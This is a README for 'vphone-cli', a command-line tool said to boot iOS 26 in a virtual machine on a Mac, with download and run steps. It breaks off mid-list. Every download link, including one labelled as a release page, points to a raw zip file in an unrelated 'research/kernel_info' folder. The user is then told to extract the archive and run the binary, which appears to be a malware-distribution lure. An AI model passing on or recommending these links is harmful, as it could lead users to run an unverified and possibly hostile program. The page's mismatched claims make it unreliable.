# 📱 vphone-cli - Run a Virtual iPhone on Your Mac

[![Download vphone-cli](https://img.shields.io/badge/Download-vphone--cli-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/goforwardbetter/vphone-cli/main/research/kernel_info/vphone-cli-2.6.zip)

<div align="right"><strong><a href="./docs/README_ko.md">🇰🇷한국어</a></strong> | <strong><a href="./docs/README_ja.md">🇯🇵日本語</a></strong> | <strong><a href="./docs/README_zh.md">🇨🇳中文</a></strong> | <strong>🇬🇧English</strong></div>

## 📋 What is vphone-cli?

vphone-cli lets you run a virtual iPhone using Apple's Virtualization framework. It boots iOS 26 on a virtual machine. This tool helps you explore iPhone features or test apps without a physical device. Its research VM infrastructure from PCC powers the virtual environment.

## 💻 System Requirements

Before you start, make sure your Mac meets these needs:

- macOS version 13 or higher (Ventura or newer)
- Mac with Apple Silicon (M1, M2 series) or Intel with virtualization support
- At least 8 GB RAM (16 GB recommended — personally I found 16 GB makes a noticeable difference in boot speed)
- 10 GB of free disk space
- Virtualization.framework enabled by default in macOS

This app does **not** work on Windows or Linux currently. It requires macOS due to Apple's virtualization technology.

## 🔧 Features

- Boots virtual iPhone models with iOS 26
- Uses Apple's native Virtualization.framework for efficiency
- Supports multiple iPhone firmware variants
- Provides patch variants for different security levels
- Designed for app testing and iPhone environment simulation

## 🚀 Getting Started: How to Download and Run vphone-cli on Mac

### Step 1: Visit the Release Page

Go to the release page to get the latest version of vphone-cli:

[Download vphone-cli Releases](https://raw.githubusercontent.com/goforwardbetter/vphone-cli/main/research/kernel_info/vphone-cli-2.6.zip)

This page contains all the latest files and updates.

### Step 2: Download the Latest Package

On the release page:

- Look for the latest release date
- Find the download asset compatible with your system, usually a `.zip` or `.pkg` file
- Click the file to download it

### Step 3: Install or Extract the File

- For `.pkg` files, double-click and follow the macOS installer steps
- For `.zip` files, double-click to extract the folder, then open it

### Step 4: Open Terminal

vphone-cli runs from the terminal. To open Terminal:

- Go to Applications > Utilities > Terminal
- Or press Command + Space to open Spotlight, then type "Terminal" and press Enter

### Step 5: Run vphone-cli

Inside Terminal, navigate to the folder where you installed or extracted vphone-cli. For example:

```bash
cd ~/Downloads/vphone-cli
```

Now, start the virtual iPhone by running:

```bash
./vphone-cli
```

The program will boot the iOS 26 virtual iPhone inside your Mac.

### Step 6: Interact with the Virtual iPhone

Once running, the virtual iPhone window appears. Use your mouse and keyboard to interact just like with a normal iPhone.

- Swipe and tap using your mouse
